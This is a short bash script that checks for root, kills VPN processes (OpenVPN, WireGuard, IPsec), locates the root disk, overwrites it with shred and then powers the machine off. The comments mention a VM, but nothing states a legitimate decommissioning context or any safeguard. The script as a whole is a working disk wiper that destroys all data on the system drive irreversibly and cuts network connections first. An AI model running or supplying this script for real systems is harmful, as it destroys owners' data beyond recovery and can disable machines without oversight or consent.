#!/bin/bash

# Ensure we're running as root
if [[ $EUID -ne 0 ]]; then
   echo "This script must be run as root"
   exit 1
fi

# Kill common VPN connections (OpenVPN, WireGuard, IPsec, etc.)
pkill -f 'openvpn|vpn|ipsec|strongswan|wg-quick'

# Detect the root disk dynamically
ROOT_DISK=$(df / | tail -1 | awk '{print $1}' | sed 's/[0-9]*$//')

# Securely wipe the detected disk
shred -v -n 3 -z $ROOT_DISK

# Shutdown the VM after wiping
poweroff
